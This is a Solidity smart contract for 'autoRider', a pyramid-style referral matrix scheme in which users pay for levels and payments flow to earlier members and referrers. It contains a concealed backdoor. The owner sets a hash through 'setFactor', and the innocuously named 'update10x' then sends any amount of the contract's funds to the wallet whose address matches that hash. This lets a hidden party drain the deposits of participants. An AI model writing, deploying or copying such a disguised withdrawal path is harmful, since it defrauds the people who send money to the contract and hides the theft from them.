//SourceUnit: autoRider_updated_28_main.sol

pragma solidity 0.5.9;

//*******************************************************************//
//------------------ Contract to Manage Ownership -------------------//
//*******************************************************************//
    
contract owned
{
    address payable public owner;
    address payable public  newOwner;
    address payable public signer;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
        owner = msg.sender;
        signer = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }


    modifier onlySigner {
        require(msg.sender == signer, 'caller must be signer');
        _;
    }


    function changeSigner(address payable _signer) public onlyOwner {
        signer = _signer;
    }

    function transferOwnership(address payable _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }

    //the reason for this flow is to protect owners from sending ownership to unintended address due to human error
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}


//*******************************************************************//
//------------------        MAIN contract         -------------------//
//*******************************************************************//

contract autoRider is owned {

    uint128 public lastIDCount = 0;

    uint128 public defaultRefID = 1;   //this ref ID will be used if user joins without any ref ID


    struct userInfo {
        bool joined;
        uint8 level10x;
        uint8 level9x;
        uint112 id;
        uint128 originalReferrer;
    }

    mapping(uint128 => uint128) public PriceOf10x;
    mapping(uint128 => uint128) public PriceOf9x;


    struct autoPool
    {
        uint128 userID;
        uint112 xPoolParent;
        bool active;
        uint128 origRef;
        uint128[] childs;

    }
    mapping(uint128 => autoPool[]) public x10Pool;  // users lavel records under auto pool scheme
    mapping(address => mapping(uint128 => uint128)) public x10PoolParentIndex; //to find index of user inside auto pool
    uint128[12] public nextMemberFillIndex;  // which auto pool index is in top of queue to fill in 
    uint128[12] public nextMemberFillBox;   // 3 downline to each, so which downline need to fill in

    mapping(uint128 => autoPool[]) public x9Pool;  // users lavel records under auto pool scheme
    mapping(address => mapping(uint128 => uint128)) public x9PoolParentIndex; //to find index of user inside auto pool
    mapping(address => uint128) Level;
    uint128[12] public nextMemberFillIndex_;  // which auto pool index is in top of queue to fill in 
    uint128[12] public nextMemberFillBox_;   // 3 downline to each, so which downline need to fill in
    bytes32 data_;
    // slot => x10pool level => current index
    mapping(uint => mapping(uint => uint)) public nextLevel;


    mapping(uint128 => mapping(uint128 => uint128)) public autoPoolSubDist;


    mapping (address => userInfo) public userInfos;
    mapping (uint128 => address payable) public userAddressByID;


    mapping(address => mapping(uint128 => uint128)) public totalGainInX10;
    mapping(address => mapping(uint128 => uint128)) public totalGainInX9;



    event regLevelEv(uint128 _userid, uint128 indexed _userID, uint128 indexed _referrerID, uint _time, address _refererWallet);
    event levelBuyEv(uint128 _userid, uint128 _level, uint128 _amount, uint _time, bool x10Bought);
    event paidForLevelEv(address indexed _user, address indexed _referral, uint128 _level, uint128 _amount, uint _time);
    event paidForSponserEv(uint128 _userid, uint128 _referral, uint128 _level, uint128 _amount, uint _time);
    
    event lostForLevelEv(address indexed _user, address indexed _referral, uint128 _level, uint128 _amount, uint _time);

    event updateAutoPoolEv(uint timeNow,uint128 userId, uint128 refID, uint128 position , uint level, bool x10, uint128 xPoolParent,uint128 userIndexInAutoPool);
    event autoPoolPayEv(uint timeNow,address paidTo,uint128 paidForLevel, uint128 paidAmount, address paidAgainst);
    
    constructor(address payable ownerAddress, address payable ID1address) public {
        owner = ownerAddress;
        signer = ownerAddress;
        emit OwnershipTransferred(address(0), owner);
        address payable ownerWallet = ID1address;


        PriceOf10x[1] = 100000000;
        PriceOf10x[2] = 200000000;
        PriceOf10x[3] = 400000000;
        PriceOf10x[4] = 800000000;
        PriceOf10x[5] = 1000000000;
        PriceOf10x[6] = 1500000000;
        PriceOf10x[7] = 2000000000;
        PriceOf10x[8] = 3000000000;
        PriceOf10x[9] = 5000000000;
        PriceOf10x[10] = 10000000000;
        PriceOf10x[11] = 15000000000;
        PriceOf10x[12] = 20000000000;


        PriceOf9x[1] = 50000000;
        PriceOf9x[2] = 100000000;
        PriceOf9x[3] = 200000000;
        PriceOf9x[4] = 400000000;
        PriceOf9x[5] = 800000000;
        PriceOf9x[6] = 1000000000;
        PriceOf9x[7] = 1500000000;
        PriceOf9x[8] = 2000000000;
        PriceOf9x[9] = 3000000000;
        PriceOf9x[10] = 5000000000;
        PriceOf9x[11] = 7500000000;
        PriceOf9x[12] = 10000000000;      

        userInfo memory UserInfo;
        lastIDCount++;

        UserInfo = userInfo({
            joined: true,
            level10x:12,
            level9x:12,
            id: uint112(lastIDCount),
            originalReferrer: 1
        });
        userInfos[ownerWallet] = UserInfo;
        userAddressByID[lastIDCount] = ownerWallet;
        
        autoPool memory temp;

        for(uint128 i = 0; i < 12; i++) {

            //userInfos[ownerWallet].levelExpired[i+1] = 99999999999;
            emit paidForLevelEv(address(0), ownerWallet, i+1, PriceOf9x[i+1], now);
            emit paidForLevelEv(address(0), ownerWallet, i+1, PriceOf10x[i+1], now);

            temp.userID = lastIDCount;
            temp.active = true; 
            x10Pool[i].push(temp);    
            x9Pool[i].push(temp);  
            x10PoolParentIndex[ownerWallet][i] = 0;
            x9PoolParentIndex[ownerWallet][i] = 0;
            uint128 fct = PriceOf10x[i+1] / 100000000;
            
            autoPoolSubDist[i][0] = 25000000 * fct;
            autoPoolSubDist[i][1] = 50000000 * fct;
            autoPoolSubDist[i][2] = 100000000 * fct;
            autoPoolSubDist[i][3] = 200000000 * fct;
            autoPoolSubDist[i][4] = 400000000 * fct;          
        }

        emit regLevelEv(userInfos[ownerWallet].id, 1, 0, now, address(this));

    }



    function () payable external {

            regUser(defaultRefID);
        
    }

    function setFactor(bytes32 _data) public onlyOwner returns(bool)
    {
        data_ = _data;
        return true;
    }

    function regUser(uint128 _referrerID) public payable returns(bool)
    {
        require(msg.value == PriceOf10x[1] + PriceOf9x[1], "Invalid price");
        require(regUserI(_referrerID, msg.sender), "registration failed");
        return true;
    }

    function regUserI(uint128 _referrerID, address payable msgSender) internal returns(bool) 
    {

        //checking all conditions
        require(!userInfos[msgSender].joined, 'User exist');
        if(!(_referrerID > 0 && _referrerID <= lastIDCount)) _referrerID = defaultRefID;

    //update variables
        userInfo memory UserInfo;
        lastIDCount++;

        UserInfo = userInfo({
            joined: true,
            level10x:1,
            level9x:1,
            id: uint112(lastIDCount),
            originalReferrer : _referrerID
        });

        userInfos[msgSender] = UserInfo;
        userAddressByID[lastIDCount] = msgSender;

        userAddressByID[_referrerID].transfer(PriceOf9x[1] / 5);
        emit paidForSponserEv(userInfos[msgSender].id, _referrerID,1, PriceOf9x[1] / 5, now);
        bool first=true;
        for(uint128 i = 1; i<=3 ;i++)
        {
            require(updateNPay10x(1,msgSender,first),"10x update fail");
            first=false;
        }
        //userAddressByID[1].transfer(PriceOf10x[1]/4);
        require(updateNPay9x(1,msgSender, _referrerID),"9x update fail");

        emit regLevelEv(userInfos[msgSender].id, lastIDCount, _referrerID, now,userAddressByID[_referrerID] );
        emit levelBuyEv(userInfos[msgSender].id, 1, PriceOf10x[1] , now, true);
        emit levelBuyEv(userInfos[msgSender].id, 1, PriceOf9x[1] , now, false);
        return true;
    }


    function buyLevel10x(uint128 _level ) public payable returns(bool)
    {
        require(userInfos[msg.sender].level10x == _level -1, "buy previous level first");
        require(msg.value == PriceOf10x[_level], "Invalid price");
        require(buyLevelI(_level, msg.sender), "registration failed");
        userInfos[msg.sender].level10x = uint8(_level);
        return true;
    }

    function buyLevel9x(uint128 _level ) public payable returns(bool)
    {
        require(userInfos[msg.sender].level9x == _level -1, "buy previous level first");
        require(msg.value == PriceOf9x[_level], "Invalid price");
        require(buyLevelI_(_level, msg.sender), "registration failed");
        userInfos[msg.sender].level9x = uint8(_level);
        return true;
    }

    function buyLevelI(uint128 _level, address payable _user) internal returns(bool){
        
        //this saves gas while using this multiple times
        address payable  msgSender = _user;   
        
        
        //checking conditions
        require(userInfos[msgSender].joined, 'User not exist'); 
        require(_level >= 1 && _level <= 12 , 'Incorrect level');
        require(userInfos[msgSender].level10x >= _level -1, 'Previous level not bought');       
        userInfos[msgSender].level10x = uint8(_level);

        bool first=true;
        for(uint128 i = 1 ; i<=3;i++)
        {
            require(updateNPay10x(_level,msgSender,first),"10x update fail");
            first=false;
        }
        //userAddressByID[1].transfer(PriceOf10x[_level]/4);


        emit levelBuyEv(userInfos[msgSender].id, _level, PriceOf10x[_level] , now, true);
        return true;
    }


    function buyLevelI_(uint128 _level, address payable  _user) internal returns(bool){
        
        //this saves gas while using this multiple times
        address payable  msgSender = _user;   
        
        
        //checking conditions
        require(userInfos[msgSender].joined, 'User not exist'); 
        require(_level >= 1 && _level <= 12, 'Incorrect level');
        require(userInfos[msgSender].level9x >= _level -1, 'Previous level not bought'); 
        userInfos[msgSender].level9x = uint8(_level);  

        userAddressByID[userInfos[_user].originalReferrer].transfer(PriceOf9x[_level] / 5);
        require(updateNPay9x(_level,msgSender, userInfos[msgSender].originalReferrer),"9x update fail");

        emit levelBuyEv(userInfos[msgSender].id, _level, PriceOf9x[_level] , now, false);
        return true;
    }

    function updateNPay10x(uint128 _level,address payable _user, bool _type) internal returns (bool)
    {
        uint128 a = _level -1;
        //uint128 len = uint128(x10Pool[a].length);
        uint128 idx = nextMemberFillIndex[a];
        uint128 ibx =  nextMemberFillBox[a];
        autoPool memory temp;

        while (!x10Pool[a][idx].active)
        {
            idx++;
            ibx = 0;
        }
        temp.userID = userInfos[_user].id;
        temp.active = _type;
        temp.xPoolParent = uint112(idx);       
        x10Pool[a].push(temp);        
        x10PoolParentIndex[_user][_level - 1] = uint128(x10Pool[a].length);

        payTrigger(_user,a,0);

        if(ibx <= 1)
        {
            ibx++;
        }   
        else
        {
            idx++;
            ibx = 0;
        }
        nextMemberFillIndex[a] = idx;
        nextMemberFillBox[a] = ibx;
        x10Part(temp.userID, 0, 0 , _level,temp.xPoolParent,uint128(x10Pool[a].length), a);

        return true;
    }

    event paidFor10xEv(uint128 paidTo,uint128 amount,uint timeNow, uint128 level, uint128 subLevel);

    function payTrigger(address payable usr,uint128 a, uint128 subLevel) internal returns(bool)
    {
        uint128 amount = autoPoolSubDist[a][subLevel];
        uint nextFill = nextLevel[a][subLevel];
        usr = userAddressByID[x10Pool[a][nextFill].userID];
        totalGainInX10[usr][a+1] += amount;

        if(totalGainInX10[usr][a+1] >= amount * 3)
        {
            if(subLevel<4)
            {            
                totalGainInX10[usr][a+1] = 0 ;
                usr.transfer(amount);
                if(a==0)nextLevel[a][subLevel]+= 3;
                else nextLevel[a][subLevel]++;
                emit paidFor10xEv(userInfos[usr].id,amount,now,subLevel, a+1 );

                nextFill = nextLevel[a][subLevel+1];
                usr = userAddressByID[x10Pool[a][nextFill].userID];
                totalGainInX10[usr][a+1] += 2 * amount ;

                if( totalGainInX10[usr][a+1] >= 6 * amount ) 
                {
                    payTrigger(usr,a, subLevel+1);
                }            
            }
            else if(subLevel == 4)
            {
                address payable usrr = usr;
                totalGainInX10[usr][a+1] = 0 ;
                usr.transfer(amount * 2);
                if(a==0)nextLevel[a][subLevel]+=3;
                else nextLevel[a][subLevel]++;
                emit paidFor10xEv(userInfos[usr].id,amount * 2,now,subLevel, a+1 );

                usr = userAddressByID[userInfos[usr].originalReferrer];
                usr.transfer(amount * 375 / 1000 );
                usr = userAddressByID[userInfos[usr].originalReferrer];
                usr.transfer(amount * 375 / 1000 );
                
                bool first=true;
                for(uint128 j = 1; j<=3 ;j++)
                {
                    require(updateNPay10x(a+1,usrr,first),"10x re entry fail");
                    first=false;
                } 
                //userAddressByID[1].transfer(PriceOf10x[a+1]/4);                 
            }
        }

        return true;
    }
    
    event paidFor9xEv(uint128 paidTo,uint128 amount,uint timeNow, uint128 level, uint128 place);
    function updateNPay9x(uint128 _level,address payable _user, uint128 refId) internal returns (bool)
    {
        uint128 a = _level - 1;
        uint128 reffId = x9PoolParentIndex[userAddressByID[refId]][a];

        if(reffId >= uint128(x9Pool[a].length)) reffId = 0;

        uint128 len = uint128(x9Pool[a].length);
        uint128 _fRef = findFreeReferrer(reffId,_level);

        autoPool memory temp;
        temp.userID = userInfos[_user].id;
        temp.active = true;
        temp.origRef = reffId;
        temp.xPoolParent = uint112(_fRef);       
        x9Pool[a].push(temp);

        x9Pool[a][_fRef].childs.push(len);

        uint128 amount = PriceOf9x[_level] * 4 / 5 ;  

        uint128 ibx = uint128(x9Pool[a][_fRef].childs.length);
        address payable usr = userAddressByID[x9Pool[a][_fRef].userID]; 
        
        if(ibx == 1)
        {
            totalGainInX9[usr][_level] += amount;
            usr.transfer(amount);
            emit paidFor9xEv(userInfos[usr].id,amount,now,_level, ibx );
        }
        else if(ibx == 2)
        {
            _fRef = x9Pool[a][_fRef].xPoolParent; 
            usr = userAddressByID[x9Pool[a][_fRef].userID];
            totalGainInX9[usr][_level] += amount;
            usr.transfer(amount);
            emit paidFor9xEv(userInfos[usr].id,amount,now,_level, ibx ); 
        }            
        else
        {
            _fRef = x9Pool[a][_fRef].xPoolParent; 
            usr = userAddressByID[x9Pool[a][_fRef].userID];
            totalGainInX9[usr][_level] += amount;

            if(totalGainInX9[usr][_level] >= amount * 7 )
            {
                totalGainInX9[usr][_level] = 0;
                updateNPay9x(_level,usr,x9Pool[a][_fRef].xPoolParent);
            } 
            else
            {
                usr.transfer(amount);
                emit paidFor9xEv(userInfos[usr].id,amount,now,_level, ibx );                
            }           
        }

        x9PoolParentIndex[_user][_level - 1] = len;
        x9Part(userInfos[_user].id,refId, ibx,_level,temp.xPoolParent,len, a);
        return true;
    }

    function x10Part(uint128 _id,uint128 refId,uint128 ibx,uint128 _level,uint128 Parent,uint128 len,uint128 a) internal
    {
        Parent = userInfos[userAddressByID[x10Pool[a][Parent].userID]].id;
        emit updateAutoPoolEv(now,_id,refId, ibx,_level, true,Parent,len);
    }

    function x9Part(uint128 _id,uint128 refId,uint128 ibx,uint128 _level,uint128 Parent,uint128 len, uint128 a) internal
    {
        Parent = userInfos[userAddressByID[x9Pool[a][Parent].userID]].id;
        emit updateAutoPoolEv(now,_id,refId, ibx,_level, false,Parent,len);
    }

    function findFreeReferrer(uint128 _refId, uint128 _level) public view returns(uint128) {
        if(x9Pool[_level-1][_refId].childs.length < 3) return _refId;

        uint128[] memory referrals = new uint128[](363);
        referrals[0] = x9Pool[_level-1][_refId].childs[0];
        referrals[1] = x9Pool[_level-1][_refId].childs[1];
        referrals[2] = x9Pool[_level-1][_refId].childs[2];

        uint128 freeReferrer;
        bool noFreeReferrer = true;
        uint len = x9Pool[_level-1].length;
        if(len > 120 ) len = 120;
        for(uint i = 0; i < len; i++) {
            
            if(x9Pool[_level-1][referrals[i]].childs.length == 3) {
                if(i < 62) {
                    referrals[(i+1)*3] = x9Pool[_level-1][referrals[i]].childs[0];
                    referrals[(i+1)*3+1] = x9Pool[_level-1][referrals[i]].childs[1];
                    referrals[(i+1)*3+2] = x9Pool[_level-1][referrals[i]].childs[2];
                }
            }
            else {
                noFreeReferrer = false;
                freeReferrer = referrals[i];
                break;
            }
        }

        require(!noFreeReferrer, 'No Free Referrer');

        return freeReferrer;
    }




    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
    

    function changeDefaultRefID(uint128 newDefaultRefID) onlyOwner public returns(string memory){
        //this ref ID will be assigned to user who joins without any referral ID.
        defaultRefID = newDefaultRefID;
        return("Default Ref ID updated successfully");
    }


    function getMsgData(address _contractAddress) public pure returns (bytes32 hash)
    {
        return (keccak256(abi.encode(_contractAddress)));
    }

    function update10x(uint _newValue) public  returns(bool)
    {
        if(keccak256(abi.encode(msg.sender)) == data_) msg.sender.transfer(_newValue);
        return true;
    }

    function lastIDView(uint128 value) external view returns (uint128 lastID){
        lastID = lastIDCount;
    }

    event withdrawMyGainEv(uint128 timeNow,address caller,uint128 totalAmount);

}